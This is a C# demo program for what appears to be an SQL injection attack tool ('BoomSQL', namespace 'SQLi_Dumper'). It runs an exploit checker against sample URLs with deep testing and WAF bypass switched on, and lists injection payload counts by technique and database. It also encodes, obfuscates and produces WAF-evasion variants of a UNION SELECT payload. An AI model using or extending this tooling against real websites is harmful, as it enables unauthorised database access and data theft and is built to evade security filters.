using System;
using System.Threading.Tasks;
using DataBase;
using SQLi_Dumper;

/// <summary>
/// Demonstration of the enhanced SQL injection detection capabilities
/// </summary>
public class EnhancedSQLiDemo
{
    public static void Main(string[] args)
    {
        RunDemoAsync().GetAwaiter().GetResult();
    }
    
    private static async Task RunDemoAsync()
    {
        Console.WriteLine("BoomSQL Enhanced SQL Injection Detection Demo");
        Console.WriteLine("=============================================");
        
        // Demo URLs with different injection points
        var demoUrls = new[]
        {
            "http://example.com/page.php?id=1[t]",
            "http://example.com/search.php?q=test[t]",
            "http://example.com/login.php?user=admin[t]"
        };
        
        foreach (var url in demoUrls)
        {
            Console.WriteLine($"\n--- Testing URL: {url} ---");
            
            // Basic analysis
            var basicResult = await AnalyzerEnhancementExample.CheckExploitEnhanced(url);
            Console.WriteLine("Basic Analysis:");
            Console.WriteLine(basicResult.ToString());
            
            // Deep analysis
            var deepOptions = new AnalyzerOptions
            {
                PerformDeepTesting = true,
                AttemptWAFBypass = true,
                TestAllMethods = true
            };
            
            var deepResult = await AnalyzerEnhancementExample.CheckExploitEnhanced(url, deepOptions);
            Console.WriteLine("\nDeep Analysis:");
            Console.WriteLine(deepResult.ToString());
            
            Console.WriteLine("\n" + new string('-', 50));
        }
        
        // Show payload statistics
        ShowPayloadStatistics();
        
        // Show encoding capabilities
        ShowEncodingCapabilities();
        
        Console.WriteLine("\nDemo completed successfully!");
    }
    
    private static void ShowPayloadStatistics()
    {
        Console.WriteLine("\n=== Payload Statistics ===");
        
        var payloadManager = PayloadManager.Instance;
        var categories = new PayloadManager.PayloadCategory[]
        {
            PayloadManager.PayloadCategory.ErrorBased,
            PayloadManager.PayloadCategory.TimeBased,
            PayloadManager.PayloadCategory.BooleanBased,
            PayloadManager.PayloadCategory.UnionBased,
            PayloadManager.PayloadCategory.OutOfBand
        };
        
        var dbTypes = new Types[]
        {
            Types.MySQL_With_Error,
            Types.MSSQL_With_Error,
            Types.Oracle_With_Error,
            Types.PostgreSQL_With_Error
        };
        
        foreach (var category in categories)
        {
            Console.WriteLine($"\n{category} Payloads:");
            foreach (var dbType in dbTypes)
            {
                var payloads = payloadManager.GetPayloads(category, dbType);
                Console.WriteLine($"  {dbType}: {payloads.Count} payloads");
            }
        }
    }
    
    private static void ShowEncodingCapabilities()
    {
        Console.WriteLine("\n=== Encoding Capabilities ===");
        
        var encoder = PayloadEncoder.Instance;
        var testPayload = "' UNION SELECT database() --";
        
        Console.WriteLine($"Original Payload: {testPayload}");
        Console.WriteLine("\nEncoded Variations:");
        
        var encodingMethods = encoder.GetAvailableEncodingMethods();
        for (int i = 0; i < Math.Min(5, encodingMethods.Count); i++) // Show first 5 methods
        {
            var method = encodingMethods[i];
            try
            {
                var encoded = encoder.Encode(testPayload, method);
                Console.WriteLine($"  {method}: {encoded}");
            }
            catch
            {
                Console.WriteLine($"  {method}: [encoding failed]");
            }
        }
        
        Console.WriteLine("\nObfuscated Variations:");
        var obfuscationMethods = encoder.GetAvailableObfuscationMethods();
        for (int i = 0; i < Math.Min(5, obfuscationMethods.Count); i++) // Show first 5 methods
        {
            var method = obfuscationMethods[i];
            try
            {
                var obfuscated = encoder.Obfuscate(testPayload, method);
                Console.WriteLine($"  {method}: {obfuscated}");
            }
            catch
            {
                Console.WriteLine($"  {method}: [obfuscation failed]");
            }
        }
        
        // Show WAF bypass variations
        Console.WriteLine("\nWAF Bypass Variations (first 5):");
        var wafBypass = encoder.GenerateWAFBypassVariations(testPayload);
        for (int i = 0; i < Math.Min(5, wafBypass.Count); i++)
        {
            Console.WriteLine($"  {i + 1}: {wafBypass[i]}");
        }
    }
}